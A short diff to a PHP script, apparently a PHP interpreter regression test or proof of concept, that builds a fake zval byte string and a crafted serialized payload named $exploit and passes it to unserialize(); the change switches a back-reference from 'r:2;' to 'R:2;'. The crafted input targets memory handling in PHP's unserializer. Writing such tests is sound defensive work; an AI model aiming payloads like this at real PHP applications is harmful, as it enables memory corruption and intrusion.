@@ -19,7 +19,7 @@ $fakezval .= "\x01";
 $fakezval .= "\x00";
 $fakezval .= "\x00\x00";
 
-$inner = 'r:2;';
+$inner = 'R:2;';
 $exploit = 'a:2:{i:0;i:1;i:1;C:3:"obj":'.strlen($inner).':{'.$inner.'}}';
 
 $data = unserialize($exploit);
